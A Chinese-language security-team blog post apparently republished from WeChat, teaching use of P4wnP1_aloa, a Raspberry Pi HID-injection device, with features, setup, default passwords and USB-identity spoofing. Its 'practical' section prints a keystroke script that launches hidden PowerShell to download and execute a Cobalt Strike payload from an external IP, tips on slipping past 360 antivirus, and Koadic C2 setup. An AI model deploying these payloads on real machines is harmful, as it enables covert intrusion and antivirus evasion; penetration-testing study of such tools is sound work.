> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8-KqChQ3XWcTWYAUwFlP8A)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：keac  
本文字数：5000

阅读时长：40~50 分钟

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

  

        P4wnP1 基于树莓派 zero (w)，是一个快捷高效的 HID 攻击平台，可以进行 Windows 密码破解、HID 隐藏信道后门、模块化 USB 设备模拟等，于 2017 年 2 月第一次发布，现在主要开发者已停止对其开发，全力开发它的升级版——P4wnP1_aloa。P4wnP1_aloa 基于树莓派 zero w，与 P4wnP1 善于高效攻击相比，P4wnP1_aloa 更注重 HID 测试，提供 web 客户端，调整、配置更加方便。P4wnP1 一次可以模拟 8 个 HID 设备，包括键盘、鼠标等。同时，P4wnP1_aloa 使用的 HIDscript 基于 JavaScript，无论是自定义脚本还是对 RubberDucky 的脚本进行改写都很方便。P4wnP1_aloa 还可以通过自定义输入速度，随机时间间隔，更好的模拟人工操作，欺骗防护机制。

截止至本篇发表日期，P4wnP1_aloa 的最新发布版本为 2018 年 12 月发布的 v0.1.0-alpha2，相关信息见 releases。由于软件尚处于开发初期，国内外资料较少，本篇基于笔者的实践对 P4wnP1_aloa 进行介绍，想要更深入的了解 P4wnP1_aloa 可以阅读官方 README 链接

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVHaITsAHhUzdiaWic5aAf0bZ7K7HbMYn1iaVaasrWna7ZDpW5A5BR9WZeg/640?wx_fmt=png)

一、

**_功能_**

模拟 USB 设备
---------

*   USB 功能：
    

*   USB 以太网（RNDIS 和 CDC ECM）
    
*   USB 串口
    
*   USB 大容量存储（闪存驱动器或 CD-Rom）
    
*   HID 键盘
    
*   HID 鼠标
    

*   USB 堆栈的运行时重新配置（不重新启动）
    
*   检测到连接 / 断开连接后，可以将 P4wnP1 ALOA 保持通电状态（外部电源）并在将仿真的 USB 设备连接到新主机时触发操作
    
*   无需处理不同的内部以太网接口，因为 CDC ECM 和 RNDIS 已连接到虚拟网桥
    
*   持久存储和加载 USB 设置的配置模板
    

HID
---

*   功能有限的 DuckyScript
    
*   通过复杂的脚本语言自动执行键盘和**鼠标操作**
    
*   最多可以并行运行 8 个 HIDScript 任务（保留一个任务来移动鼠标，而其他任务则按需启动以无缝地进行任意鼠标击键注入操作）
    
*   HIDScript 基于 JavaScript，并且具有可用的公共库，该库允许使用更复杂的脚本（函数调用，`Math`用于鼠标计算等）。
    
*   键盘
    

*   基于 UTF-8，因此对 ASCII 字符没有限制
    
*   可以通过读回 NUMLOCK，CAPSLOCK 和 SCROLLLOCK 的 LED 状态更改来响应主机真实键盘的反馈（如果目标操作系统在所有连接的键盘上共享 LED 状态，则 OSX 并非如此）
    
*   根据 LED 反馈在 HIDScript 中做出分支决策
    

*   鼠标
    

*   相对运动（快速但不精确）
    
*   步进相对移动（速度较慢，但准确... 以 1 DPI 步进移动鼠标）
    
*   在 Windows 上的**绝对定位**（如果已知目标屏幕的尺寸，则像素完美）
    

*   键盘和鼠标不仅由相同的脚本语言控制，而且都可以在同一脚本中使用。这样可以将它们组合起来以实现目标，而仅使用键盘或鼠标是无法实现的。
    
*   支持语言布局：br，de，es，fr，gb，it，ru 和 us
    

蓝牙
--

*   与 Bluez 堆栈的完整接口（当前不支持远程设备发现 / 连接）
    
*   允许运行蓝牙网络访问点（NAP）
    
*   可自定义的配对（基于 PIN 的旧版模式或 SSP）
    
*   高速传输（使用 802.11 帧实现 WiFi 等传输速率）
    
*   蓝牙堆栈的运行时重新配置
    
*   注意：也可以使用 PANU，但目前不支持（无远程设备连接）
    
*   持久存储和加载蓝牙设置的配置模板
    

无线上网
----

*   修改的固件（使用 Nexmon 框架构建）
    

*   允许 KARMA（欺骗由远程设备探测的访问点的有效答案并允许关联）
    
*   广播其他信标，以模拟多个 SSID
    
*   WiFi 隐秘频道
    
*   注意：包含 Nexmon 旧版监视模式，但 P4wnP1 不支持。监视模式仍然存在问题，并且如果配置发生更改，固件可能会崩溃。
    

*   轻松配置接入点
    
*   轻松的站模式配置（连接到现有的 AP）
    
*   故障转移模式（如果无法连接到目标访问点，启动自己的访问）
    
*   WiFi 堆栈的运行时重新配置
    
*   永久存储和加载 WiFi 设置的配置模板
    

### 连网

*   简单的以太网接口配置
    

*   蓝牙 NAP 接口
    
*   USB 接口（如果启用了 RNDIS / CDC ECM）
    
*   WiFi 接口
    

*   支持每个接口专用的 DHCP 服务器
    
*   支持 DHCP 客户端模式
    
*   手动配置
    
*   持久存储和加载每个接口的配置模板
    

二、

**_所需硬件_**

*   树莓派`Zero W`
    
*   `USB`接头
    
*   `TF`卡一张
    

大约 150~200RMB  

三、

**_安装_**

首先到 P4wnP1_aloa 的 releases 页面下载镜像文件或在狼盘下载（关注公众号回复 “ P4wnP1 ” 获取下载地址）。P4wnP1 的系统基于 Raspbian，而 P4wnP1_aloa 则基于 kali，内置了很多安全工具（kali 的官方下载页也有 P4wnP1 镜像，但要注意是原版 P4wnP1，而非本篇介绍的 P4wnP1_aloa）。

解压压缩文件，用 Etcher 或 win32DiskImager（笔者使用的是 win32DiskImager）将得到的 img 镜像文件写入 micro SD 卡（8G 够用）。

将 micro SD 卡插入树莓派 zero w，电源连接标有 PWR（远离 CPU 的那个）的 usb 接口，指示灯闪烁表明上电成功。我这里使用了一块 USB 接头，直接插入电脑 USB 口即可。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVMgvcdSmCCFyotT3fddsEuobSSuZx6JdtTp8jwW3Zk248t9uTjFEFoA/640?wx_fmt=png) 

当然如果可以套个 3D 打印的壳子效果会更好，完全仿真正常设备，比如比较大的无线网卡等等，也可以套个移动硬盘的壳子，里面拿根 micro usb 的数据线进行连接，至于还能怎么伪装相信各位大师傅都有自己的骚思路。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVtdsvaAXV5lpmbI1veXOiaJp78Rx4wvAKhLFhTaQdW0Yxo4e9K3xz9gQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVIOklsCiaIP1Fj1UwFVib2JQwlUFSSZOFny4raWfZiaJJ13oIGQYH0N4rw/640?wx_fmt=png)

插上电之后使用电脑或手机查看 WIFI 热点，若出现名字中含有 P4wnP1 的热点则启动完成。连接热点，密码`MaMe82-P4wnP1`。但是由于 P4wnP1_aloa 只是起了一个 WiFi 热点，没有真正接入互联网，因此会提示无网络。电脑连接建议使用两个网卡，一个用来连接 P4wnP1_aloa，另一个访问 Internet。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV3DcX9rmNOxXTbyg2Wp2ZuABKJr393zKoabb8GNNibgYOYJzJp5ScTaw/640?wx_fmt=png)

如果你跟我一样是个穷逼无线网卡也买不起，P4wnP1_aloa 也自带了无线网卡功能，

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVIXpzOmlTLQUTGmic7xoGpwNtrGXAX7xGIsIAIvvvz9VtrFSK2VGnktw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVxdibTN8icITtm7BZHrX6pBd0RvVXO1ia0RjFgb7Rh9GicPTp6KvNkz4eKg/640?wx_fmt=png)

WIFI 连接完成后可以通过浏览器访问 http://172.24.0.1:8000 进入 P4wnP1_aloa 的 web 控制界面（注意关闭代理，否则无法访问）。也可以通过 172.24.0.1 的 22 端口进行 ssh 连接，系统为 kali 默认用户名`root`，密码`toor`。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVTIlQygFRzDHpC76LoFgLbj6AtjZ9fY7LqWOujmOseMqicUMt6FSXkZQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV0UwamsNtibmojqqPtIp0A1icjQW5lUpcle0cWDtfIibVPt86JW4haH0Rw/640?wx_fmt=png)

简单介绍下

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVnRiasfnaDqp0icdJjoMO1y3sMCT87EDxWC8fPBL27AGPmFXkNvaTUepA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVyIEiaibxdQ2QXwQH0u2dnT24azZnqpBFr32LgMMKgoRhKkQM65MWWaEA/640?wx_fmt=png)

那么 P4wnP1_aloa 的安装至此结束。

四、

**_使用_**

WEB 端
-----

P4wnP1_aloa 的 web 端实现了大部分功能（比 ssh 端能做的还要多！）下面依次介绍各模块（作者称之为模板 template）。

### HIDScript

这个是重点，可以执行高效的攻击命令和来的`P4wnP1`相比可做的事情多太多了，据官方文档所写的是基于`JavaScript`的

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVRVfYwnNibicBCSVDpPtKSXNaREaovgVDjEL4uD8jXiaf8VSGtwJz4mYiaQ/640?wx_fmt=png)

```
layout('us'); //键盘布局，国内一般us
typingSpeed(标准间隔,随机值); //ms为单位，每个操作间的时间间隔
delay(时间值); //ms为单位，等待一定时间
type('xxxxx\n'); //输入字符串，注意是敲击按键，大小写无保证
press('GUI X'); //按下按键再自动松开 
moveStepped(x,y); //鼠标相对运动
moveTo(x,y); //鼠标移动到绝对位置
function fun() { 
    //定义函数
}
waitLEDRepeat(NUM); //等待连按num lock键，可以识别CAPS等按键，实现逻辑控制
```

他也有许多内置的 HID 脚本，有兴趣的可以看看，回头有时间跟大家一起分析下

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVVLUkWTYyGVpxMtZ4dia0cwt6Ss8aAm5a1mGD8Savafeo0YTicwNJazRg/640?wx_fmt=png)

有了 HIDscript，可以很方便的把 RubberDucky 的脚本迁移到 P4wnP1_aloa 平台上。但尚且无法完成 BashBunny 的很多功能，下文将进一步介绍如何通过 master template 实现 BashBunny 的大部分功能。

### Trigger Action

触发机制，通过某项事件或者操作触发一项或者多项操作

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV7JU3p00X0hXEA7JO6zDfvPu1IiaSLPD6ZJnD8ytHiagHpcpXRAQZcLKg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV0icIDKEaqbQcVNCDAnAT5o9xeHKosQYdwpfWWJ3sGAbdd2a0eicSfy3A/640?wx_fmt=png)

触发条件包括：服务启动、USB 连接、USB 断开、WIFI 热点启动、连接已有热点、GPOI 输入等。其中 GPOI 输入是利用了树莓派的特点定制的。

执行事件包括：打印 log、（kali 系统）运行 bash 脚本、运行 HIDScript、加载并部署模板、GPIO 输出等。

配置全部以下拉选项提供给用户，避免了错误输入带来的效率降低，也更加直观易读。

One shot 设定，开启后触发机制只触发一次，随后不再触发。

### USB Settings

在这里我们可以对供应商 ID、制作者 ID、生产商名称、序列号、产品名字进行自定义设置。

并且可以对键盘、鼠标、存储设备（模拟`USB`闪存驱动器或`CD-ROM`）、序列化接口、`RBDIS`（`Windows`上的`USB`以太网）、`CDC ECM`（针对`UNIX Linux OSX`的`USB`网络）进行选择。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVn7tibDcNS9fRISrCU90mkx5UlgXYgEFu9gAtadkInhgZZMdJTLmDiaAA/640?wx_fmt=png)

#### 修改产品标识

好不容易插上目标电脑结果弹出一个奇奇怪怪的设备总是很奇怪，所以我们还需要更改下设备的 USB 标识

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVHpulmr1y3jvglbZsX8Xf7I30Y4t7w3q4mPhFnq1JQWYZFTaeJ1zfcQ/640?wx_fmt=png)

设置中的供应商 ID、产品 ID 可以按照 http://www.linux-usb.org/usb.ids 上查找对应的一些设备来修改

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVHqH8HibjTdZS3jJBXmx1ZDbLtPoL6iaruGycicOVlhHgaZk3fPBSEE26w/640?wx_fmt=png)

修改为如图格式

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVOOVAJBvBiaJqmlbLx0icwr1y1uDQD29YzFVYlYEoMx9UV4Yhkx7um8Og/640?wx_fmt=png)

插入电脑后从设备与打印机就可以看到我们设置的设备

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVlicAVY7yCibdib3gtIicbv3u2v4jlzAusX3gCvp6hjQ9LRBVQFlD3AGJIw/640?wx_fmt=png)

查看下属性信息

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVPFdhpAB04BLFNTEPXxzYGPH0FLLBkvxFBEiaGIibKCHclvGA8kfFjG0w/640?wx_fmt=png)

效果就是这样，可以尝试修改成其他的厂商比如金士顿的产品 id 等等。

#### USB 功能

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVI8ia9EFSPncwKnnWnicIrJ43POxodGURM9Ou2wFIVGw5PgmLCTSzjMDg/640?wx_fmt=png)

第一二个都是无线网卡功能，可以用来给不出网的目标设备连上网络，或者是躲避一些流量检测设备进行攻击，效果如图

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV6wE7fH0Qtfib9eLPm3pMN4JducKKjOfegE37KwichgpQSx4xnhZibvdjg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVjYw4sfxXicUuSKOdtzHC3W3PjcLeB6iaUq0PCuY5YI9fZ3xznX9VJzicw/640?wx_fmt=png)

MAC 地址可在页面中进行配置

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVaicfWD1x0Z2Mxh2dEFcsk8UGJVLoeXkibYGT3jdwURJ2U25POoD8xYvA/640?wx_fmt=png)

MAC 设备由于手头没有就不演示了（穷

这个功能配合上下面提到的 wifi 就可以配合让目标机器出网了。

#### 模拟 U 盘

当然作为一个 “U 盘” 少不了的肯定是存储功能，打开存储功能，选择对应的 bin

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV0XNor24XG1cx0zEgH8fuMx1I5toLsvFUO1FW5ksOMz444whruSEjow/640?wx_fmt=png)

重新构建之后就可以在看到 U 盘了

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVHpFk3OlCyeh0EXPmiaahqABmnduMnPOfStu7BGq4KI7dibpQvUQQpUkA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVQQLSVB2h36QKVBsXPXpzswtib2CqQyIVAqjBeib4CtYt6pWiaNueRmJqg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV7wKr7Vo4WbZf8VttgTInVX7NTciaaaoB68Zq2t1AH1CZaSR9Et9hRBw/640?wx_fmt=png)

我们也可以自定义容量以及内容，这时候就需要 SSH 登陆到 pi zero 上进行生成

> CD-ROM 的模拟文件：/usr/local//P4wnP1/dist/ums/cdrom
> 
> USB 存储设备的模拟文件：/usr/local/P4wnP1/ums/flashdrive/
> 
> 生成 USB 存储设备：/usr/local/P4wnP1/dist/helper/genimg

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVibtWWbNteqSCm8SM7KJD3PibHokApDmicmOxKyULheBiaPUa3N2wXLw7mA/640?wx_fmt=png)

P4wnP1 自带了一个生成功能

```
genimg
-------------------
Generates FAT32 or ISO CD-Rom images for P4wnP1 A.L.O.A.
USB mass storage emulation
Usage: genimage -i <folder> -o <imagename>
Options:
  -h, --help
      This help text.
  -c, --cdrom
      Build UDF joilet ISO image, if not given build FAT32 image.
  -l <string>, --label <string>
      Used as volume ID for ISO image or drive label for FAT32
  -s <number>, --size <number>
      Image size in MByte (applies only to FAT32 image)
  -i <folder>, --input <folder>
      Input folder used to build the CD-Rom image.
      Optional for FAT32 iamge, if given content is copied.
  -o <imagename>, --output <imagename>
      Output file name (without extension and path).
```

```
/usr/local/P4wnP1/helper/genimg -l QAX -s 100 -i test/ -o QAX
```

```
root@kali:~# P4wnP1_cli -h
The CLI client tool could be used to configure P4wnP1 A.L.O.A.
from the command line. The tool relies on RPC so it could be used 
remotely.
Version: v0.1.0-alpha2
Usage:
  P4wnP1_cli [command]
Available Commands:
  db          Database backup and restore #数据库备份和还原
  evt         Receive P4wnP1 service events#接收P4wnP1服务事件
  help        Help about any command
  hid         Use keyboard or mouse functionality #  使用键盘或鼠标功能
  led         Set or Get LED state of P4wnP1 #设置树莓派led灯闪烁频率
  net         Configure Network settings of ethernet interfaces (including USB ethernet if enabled)#配置以太网接口的网络设置（如果启用，则包括USB以太网）
  system      system commands #系统命令
  template    Deploy and list templates #部署并列出模板
  trigger     Fire a group send action or wait for a group receive trigger#触发模板之类的
  usb         USB gadget settings #USB小工具设置
  wifi        Configure WiFi (spawn Access Point or join WiFi networks)#配置WiFi（生成接入点或加入WiFi网络）
Flags:
  -h, --help          help for P4wnP1_cli
      --host string   The host with the listening P4wnP1 RPC server (default "localhost")
      --port string   The port on which the P4wnP1 RPC server is listening (default "50051")
Use "P4wnP1_cli [command] --help" for more information about a command.
root@kali:~# P4wnP1_cli led --help#查看led模块的详细命令
Set or Get LED state of P4wnP1
Usage:
  P4wnP1_cli led [flags]
Flags:
  -b, --blink uint32   Set blink count (0: Off, 1..254: blink n times, >254: On)#设置为0等于关闭闪烁大于254等于常亮
  -h, --help           help for led
Global Flags:
      --host string   The host with the listening P4wnP1 RPC server (default "localhost")
      --port string   The port on which the P4wnP1 RPC server is listening (default "50051")
```

那我们使用这样一条命令来生成一个 U 盘

```
layout('us');           // US keyboard layout
typingSpeed(0,0);
press("GUI r");
delay(500);
type("powershell\n")
delay(500);
type("powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://1**.**.**.94:8083/a'))\"")
delay(500);
type("\n")
```

生成一个标签为 QAX 的 容量为 100M 并且把 test 下面的所有内容放进去 输出为 QAX.bin  

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVfdYwibSibiaa7XQqv9ZOgjPb8mYRHib0DHSGOPqI5dA0v19ia3FODbSSRiag/640?wx_fmt=png)

这个时候我们再去选

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVV8F4J1VCKGU7RKzfwSic6jDq5tibjMJ0BKnDfKkPiaM2XhSTXLK0AVwFA/640?wx_fmt=png)

构建好后就会看到

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVxm7FcHHTnWcPpP2yU2Q96p9SWicya9whMnToicqxtLMAp492h2otpIMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVp7SO57ADj12q0aTKLrRwkIrTIc2YwhwfctwPIumoeasL06aqBC5iaxA/640?wx_fmt=png)

当然这个系统时间有点不太对劲，不舒服的可以调调

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVddEac4DOquouyhCy3z3JQTQicYu4TEVI52ibgMhSPCmhSTaZglbtn3iaA/640?wx_fmt=png)

### WIFI Settings

这里就可以对`WIFI`名称和密码、信道、加密方式、是否隐藏`SSID`（这个一般必开）、所在国家、工作模式（`AP`或客户端）

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVObZOz18gobT4YgvSAF0eicbs21WW7Jef6TEP2EOzlnUnibVT84rydCSQ/640?wx_fmt=png)

接入模式

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV2BMtcerYYo0TWaxicqaic2E3cNhsZN5D75clbVHRKS4GZPOp1H2eCEiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVicoEZg4VxiakKgM51C14AVvddBrLSibOXCObqOdxyeic6lPcwib88GkOEHw/640?wx_fmt=png)

修改好点击`store`来把配置保存在树莓派中然后点击 `DEPLOY STORED`即可

切记密码长度要大于 8 位不然会导致设置失败

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVUv918Fj6Ad7U52eLTq9qnDLJwUPVwmO8GsLaf3mt6cVicajUia3AwgtQ/640?wx_fmt=png)

### Bluetooth Settings

蓝牙这块感觉暂时没啥用，还不如 WIFI 来的实在，回头再研究下。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVWcng1j1oHI9RaT9l52oOn9vtxsbX4lTHf0jIuib2XlfT0ay8icPia7eNQ/640?wx_fmt=png)

### Network Settings

这里就可以对网络和`DHCP`进行的一些设置，可以设定网卡、工作模式、DHCP 服务等，这里就按照实际情况来调整了。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVsncZ8GypY2qdOGeib0wUy7gcVtdraIr77Qyvf5vO13bWf3E4BnpvO7g/640?wx_fmt=png)

### Event Log

事件日志，在测试配置时可以检查 trigger 条件是否被触发，注意刷新页面时会重置

### Generic Settings

模板编辑，存放之前编辑的设置，每次开机会套用这里的模板

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVQEbibrV7AlWmXEQngQnR2FSX4yvuz6ZM41ho91hbYJqrHBIQffyehibg/640?wx_fmt=png)

如果你想开机加载的`WiFi`为你设置的`WiFi`，首先要在`WiFi settings`模块中上传你的`WiFi`模板，然后按下图设置后点`REBOOT`即可，如果你还想做其他开机启动操作都是类似的

以 WIFI 举例，先设置好自己的 WIFI 模式，并点保存。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVjibLibRup7dyiahiaesf5FTyUOgBnfmCAQ6aUauvMDuEYMic6ibJOeaRaLVQ/640?wx_fmt=png)

然后在设置里面选择 WIFI 模板

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVoMPOgCk8AQFFO9gDWODicaPg2rnicKibEUaBicdRCDtdibgCvZGPmtpOALw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVHTI6NEfdhxdDSAybQ3QN6mUdHWCMRibtg6N4FRDZg3qzm3aMFdZGaHw/640?wx_fmt=png)

**一定要检查 WIFI 模板的配置，防止无法连接。**另外还有备份与恢复功能，通过数据库进行备份、恢复。

SSH 端
-----

SSH 进去首先先改密码！

P4wnP1_aloa 的 web 目录在 `/root/P4wnP1/dist`

`ssh`也可以做`web`的工作，官方根据官方给出的文档输入`P4wnP1_cli -h`可以查看帮助文档，ssh 端有些设置只能一次性修改，不能保存，这里不详述。

```
git clone https://github.com/zerosum0x0/koadic.git
pip3 install -r requirements.txt
./koadic
```

比如我们可以设置 LED 灯

P4wnP1_cli led -b 数字 设定指示灯闪烁频率 0 就不亮了，数字越大越快，这个可以结合上文提到的`Trigger Action` 进行操作回显，比如判断是否成功等等，还有很多联动的方式。

实战
==

在使用过程中经常会遇到存在杀软的情况，不过发现火绒剑可以直接结束掉 360 和火绒自己的进程（火绒似乎不会恢复？）。有兴趣的师傅可以看看怎么利用。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVN4Vlyse1mF5aD0rv1jnxicrDbIYFOuNqFIeJzhhu0dSb1nvWvEIdGuw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV1ZWVnkFmRExsjoavB5SP2U0G340jZ9bwGKictBU7fjkDatRg7kQfRpw/640?wx_fmt=png)

火绒进程被杀掉之后不会重新启动，360 会在大约 1 分钟左右再次自己启动，利用这个空挡可以上线东西了。

目标机器上线 CS
---------

```
layout('us');           // US keyboard layout
typingSpeed(0,0);
press("GUI r");
delay(500);
type("powershell\n")
delay(500);
type("powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://1**.**.**.94:8083/a'))\"")
delay(500);
type("\n")
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV4zJoH14B8yDCsofUDjheXUdkj8kFBLM0anOMKN7icbfhRhYG0pNNlyg/640?wx_fmt=png)

插入目标电脑点击 RUN，可以看到目标机器一闪而过的窗口 机器成功上线，速度要是足够快，360 就不会拦截，不过第二次就会拦截了。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rV48HyYfvGvKAWzyNicf8hApaJpZcatX9cibvEQf3iapk0WcwI3U6d1GY2w/640?wx_fmt=png)

Koadic 脚本反弹
-----------

> Koadic 或 COM Command＆Control 是一款 Windows 后期开发 rootkit，类似于其他渗透测试工具，如 Meterpreter 和 Powershell Empire。主要区别在于，Koadic 使用 Windows Script Host（又名 JScript / VBScript）执行其大部分操作，并在内核中具有兼容性，以支持 Windows 2000 的默认安装，并且始终没有 Service Pack（甚至可能包含 NT4 的版本）通过 Windows 10。

```
git clone https://github.com/zerosum0x0/koadic.git
pip3 install -r requirements.txt
./koadic
```

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVtAj9tZ9iabZiaSql1HbEOsf5JL2ibo2sCc6wUKvOwLIibEjh7jUmDI67yQ/640?wx_fmt=png)

不过在运行的时候可能会遇到 360 拦截，但火绒毫无动静

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVJ4ePEU1vqUULp6S8nxzsAMp4icpW0Jsut7K66bPbznnAibiaH9nC9pdeQ/640?wx_fmt=png)

    未完待续..  

**还有更多实战方式等着师傅们来拓展了**

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzAw5q6BYdyvpK1WJ8icRib4rVRWib9vibBaeIoSjjx3T7cYvDj8vdqNdryA9AnZ7mNH65gEIbREibEj5bg/640?wx_fmt=jpeg)

  

**_后记_**

  

由于篇幅原因，就写到这里了。大佬们的花样肯定比我多~

参考文章：

https://github.com/RoganDawes/P4wnP1_aloa

https://p4wnp1.readthedocs.io/en/latest/

https://houwenda.github.io/2019/01/22/hid-attack-with-P4wnP1-a-l-o-a/

https://www.ascotbe.com/2019/06/29/raspberry/

**想加入团队的师傅们投简历到 admin@wgpsec.org**

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzC9OwY5TYhWG7Fb4pkTOLbBF0oruBJcKMUQiaak37L3CZ3fmicbveNiau45otj0B5eBbibXpk9X4Tu25w/640?wx_fmt=jpeg)

Keac

一个喜欢搞点事情的人

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)